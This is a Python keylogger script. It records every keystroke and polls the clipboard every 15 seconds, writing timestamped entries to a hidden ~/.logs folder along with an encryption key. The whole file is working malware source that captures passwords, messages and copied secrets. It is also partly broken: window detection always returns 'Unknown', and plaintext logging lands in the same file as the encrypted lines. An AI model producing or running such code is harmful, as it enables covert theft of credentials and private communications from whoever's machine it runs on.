import os
import time
import getpass
import logging
import psutil
import pyperclip
import threading
from pynput import keyboard
from cryptography.fernet import Fernet

# Get username and log path
username = getpass.getuser()
log_dir = f"/home/{username}/.logs"
log_file = f"{log_dir}/keystrokes.log"
key_file = f"{log_dir}/secret.key"

# Ensure log directory exists
os.makedirs(log_dir, exist_ok=True)

# Generate encryption key if it doesn't exist
if not os.path.exists(key_file):
    key = Fernet.generate_key()
    with open(key_file, "wb") as f:
        f.write(key)
else:
    with open(key_file, "rb") as f:
        key = f.read()

cipher = Fernet(key)

# Setup logging
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")

def encrypt_log(text):
    """Encrypt and log data."""
    return cipher.encrypt(text.encode()).decode()

def get_active_window():
    """Get the active window title and process name."""
    active_window = "Unknown"
    process_name = "Unknown"
    
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.pid == psutil.Process().ppid():
                process_name = proc.name()
                break
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

    return active_window, process_name

def log_key(key):
    """Log keystrokes, active window, and process name."""
    key = str(key).replace("'", "")  
    if key == "Key.space":
        key = " "
    elif key == "Key.enter":
        key = "\n"
    elif key.startswith("Key."):
        key = f"[{key[4:].upper()}]"
    
    active_window, process_name = get_active_window()
    log_data = f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {active_window} ({process_name}): {key}"
    encrypted_data = encrypt_log(log_data)

    with open(log_file, "a") as f:
        f.write(encrypted_data + "\n")

    logging.info(log_data)

def log_clipboard():
    """Log clipboard contents every 15 seconds."""
    while True:
        time.sleep(15)
        clipboard_content = pyperclip.paste()
        if clipboard_content:
            log_data = f"{time.strftime('%Y-%m-%d %H:%M:%S')} - [CLIPBOARD] {clipboard_content}"
            encrypted_data = encrypt_log(log_data)
            with open(log_file, "a") as f:
                f.write(encrypted_data + "\n")
            logging.info(log_data)

# Start clipboard logging in a separate thread
threading.Thread(target=log_clipboard, daemon=True).start()

def on_press(key):
    log_key(key)

def on_release(key):
    if key == keyboard.Key.esc:
        print(f"\n[INFO] Keylogger Stopped. Logs saved at: {log_file}\n")
        return False

print(f"Logging keystrokes... (Session ID: {time.strftime('%Y-%m-%d_%H-%M-%S')})")
print(f"\n[INFO] Keystrokes are being saved at: {log_file}\nPress 'Esc' to stop logging.")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

